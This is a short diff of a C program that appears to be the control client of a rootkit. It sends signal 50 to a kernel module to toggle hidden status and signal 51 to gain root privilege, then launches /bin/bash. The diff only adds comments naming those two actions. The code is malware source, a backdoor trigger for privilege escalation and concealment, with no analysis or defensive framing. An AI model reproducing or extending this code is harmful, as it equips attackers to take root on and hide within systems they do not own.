@@ -13,8 +13,10 @@ int main(int argc, char *argv[]) {
     char *envp[1] = { NULL };
     char *arg[3] = {"/bin/bash", NULL};
     if(strcmp(argv[1], "show") == 0){
+        // printf("Toggle hidden status.\n");
         kill(getuid(), 50);
     } else if (strcmp(argv[1], "root") == 0) {
+        // printf("Get root privilege.\n");
         kill(getuid(), 51);
         execve(bash, arg, envp);
     }
